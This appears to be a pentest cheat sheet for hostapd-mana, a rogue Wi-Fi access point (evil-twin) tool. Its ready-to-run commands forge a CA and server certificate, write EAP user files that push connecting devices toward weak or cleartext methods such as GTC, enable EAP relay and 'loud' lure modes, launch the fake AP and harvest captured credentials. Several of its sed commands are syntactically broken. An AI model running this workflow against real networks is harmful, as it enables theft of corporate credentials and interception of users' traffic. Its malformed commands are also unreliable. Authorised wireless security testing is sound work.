# hostapd-mana
% wifi, hostapd-mana, Access Point, rogue AP, evil-twin
#plateform/linux #target/remote #cat/RECON #cat/ATTACK

## _desc
```
rogue wifi access point tool. It can be used for a myriad of purposes from tracking and deanonymising devices (aka Snoopy), gathering corporate credentials from devices attempting EAP (aka WPE) or attracting as many devices as possible to connect to perform MitM attacks.
```

## _repo
```
https://github.com/sensepost/hostapd-mana
```

## _doc
```
https://github.com/sensepost/hostapd-mana/wiki
```

## _install
```
```

## Generate Diffie-Hellman parameters
```bash
openssl dhparam -out <ossl_dh_file|dh.pem> <ossl_dh_bits|2048>
```

## Generate CA (RSA)
```bash
openssl genrsa -out <ossl_ca_key_file|ca-key.pem> <ossl_ca_bits|2048> && openssl req -new -x509 -nodes -days <ossl_ca_cert_days|100> -key <ossl_ca_key_file|ca-key.pem> -out <ossl_ca_cert_file|ca.pem> -subj '/C=<ossl_srv_subj_C|US>/ST=<ossl_srv_subj_ST|California>/L=<ossl_srv_subj_L|San-Francisco>/O=<ossl_srv_subj_O|Jubeaz>/OU=<ossl_srv_subj_OU|IT-Department>/CN=<ossl_srv_subj_CN|JubeazCA>'
```


## Generate server (RSA)
```bash
echo -e '[ req ]\ndistinguished_name = dn\nattributes = att\nreq_extensions = ext\nprompt = no\n[ext]\nsubjectAltName = DNS:<ossl_srv_fqdn|jubeaz.com>\n[dn]\ncountryName = <ossl_srv_subj_C|US>\nstateOrProvinceName = <ossl_srv_subj_ST|California>\nlocalityName = <ossl_srv_subj_L|San-Francisco>\n0.organizationName = <ossl_srv_subj_O|Jubeaz>\norganizationalUnitName = <ossl_srv_subj_OU|IT-Department>\ncommonName = <ossl_srv_subj_CN|Jubeaz>\n[att]\nchallengePassword = <ossl_srv_challenge|challenge1234>' > <ossl_srv_cnf_file|server.cnf> && openssl req -newkey rsa:<ossl_srv_bits|2048> -nodes -keyout <ossl_srv_key_file|server-key.pem> -out <ossl_srv_csr_file|server.csr> -config <ossl_srv_cnf_file|server.cnf> && openssl x509 -req -days <ossl_srv_cert_days|100> -set_serial 01 -in <ossl_srv_csr_file|server.csr>  -out <ossl_srv_crt_file|server.pem>  -CA <ossl_ca_cert_file|ca.pem>  -CAkey <ossl_ca_key_file|ca-key.pem>
```


## config - show 
```bash
cat <hostapd_mana_config|hostapd-mana.conf> | grep -v '^#' | grep -v '^\s*$'
```

## config - create (EAP)
```bash
cp ~/.config/hostapd-mana/hostapd.conf.eap_pentest <hostapd_mana_config|hostapd-mana.conf>
```

## config - create eap_user files
```bash
echo -e '* TTLS,PEAP,TLS,MD5,GTC\n"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MD5 "<ossl_srv_challenge|challenge1234>" [2]' > hostapd.eap_user && echo -e '* TTLS,PEAP,TLS,MD5,GTC\n"t" GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5 "<ossl_srv_challenge|challenge1234>" [2]' > hostapd.eap_user.balanced && echo -e '* TTLS,PEAP,TLS,MD5,GTC\n"t" GTC "<ossl_srv_challenge|challenge1234>" [2]' > hostapd.eap_user.gtc && echo -e '* TTLS,PEAP,TLS,MD5,GTC\n"t" GTC,TTLS-PAP,MD5,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,TTLS-MSCHAPV2,TTLS "<ossl_srv_challenge|challenge1234>" [2]' > hostapd.eap_user.weakest && echo -e '* TTLS,PEAP,TLS,MD5,GTC\n"t" MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,GTC,TTLS-PAP,TTLS-MSCHAP,MD5 "<ossl_srv_challenge|challenge1234>" [2]' > hostapd.eap_user.strongest && echo -e '* TTLS,PEAP,TLS,MD5,GTC\n"t" TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP   "challenge1234"[2]' > hostapd.eap_user.relay
```

## config - set channel (2.4Ghz)
```bash
sed -i 's/^hw_mode=.*/hw_mode=g/' <hostapd_mana_config|hostapd-mana.conf> && sed -i 's/^channel=.*/channel=<wlan_channel|1>/' <hostapd_mana_config|hostapd-mana.conf>
```

## config - set channel (5Ghz)
```bash
sed -i 's/^hw_mode=.*/hw_mode=a/' <hostapd_mana_config|hostapd-mana.conf> && sed -i 's/^channel=.*/channel=<wlan_channel>/' <hostapd_mana_config|hostapd-mana.conf>
```

## config - set ssid
```bash
sed -i 's/^ssid=.*/ssid=<ssid>/' <hostapd_mana_config|hostapd-mana.conf>
```

## config - mana loud (enable)
```bash
sed -i 's/^mana_loud=.*/mana_loud=1/' <hostapd_mana_config|hostapd-mana.conf>  
```

## config - mana loud (disable)
```bash
sed -i 's/^mana_loud=.*/mana_loud=0/' <hostapd_mana_config|hostapd-mana.conf>  
```

## config - EAP relay (enable)
```bash
sed -i 's/^enable_sycophant=.*/enable_sycophant=1/' <hostapd_mana_config|hostapd-mana.conf>  && sed -i 's/^eap_user_file=.*/eap_user_file=hostapd.eap_user.relay' <hostapd_mana_config|hostapd-mana.conf> 
```

## config - EAP relay (disable)
```bash
sed -i 's/^enable_sycophant=.*/enable_sycophant=0/' <hostapd_mana_config|hostapd-mana.conf>  && sed -i 's/^eap_user_file=.*/eap_user_file=hostapd.eap_user' <hostapd_mana_config|hostapd-mana.conf> 
```

## config - set eap_user (default)
```bash
 sed -i 's/^eap_user_file=.*/eap_user_file=hostapd.eap_user' <hostapd_mana_config|hostapd-mana.conf> 
```

## config - set eap_user (Balanced)
```bash
 sed -i 's/^eap_user_file=.*/eap_user_file=hostapd.eap_user.balanced' <hostapd_mana_config|hostapd-mana.conf> 
```

## config - set eap_user (GTC)
```bash
 sed -i 's/^eap_user_file=.*eap_user_file=hostapd.eap_user.gtc' <hostapd_mana_config|hostapd-mana.conf> 
```

## config - set eap_user (weakest to strongest)
```bash
 sed -i 's/^eap_user_file=.*eap_user_file=hostapd.eap_user.weakest' <hostapd_mana_config|hostapd-mana.conf> 
```

## config - set eap_user (strongest to weakest)
```bash
 sed -i 's/^eap_user_file=.*/eap_user_file=hostapd.eap_user.strongest' <hostapd_mana_config|hostapd-mana.conf> 
```

## launch
```bash
sudo hostapd-mana <hostapd_mana_config|hostapd-mana.conf>
```

## harvest
```bash
cat credentials.creds 
```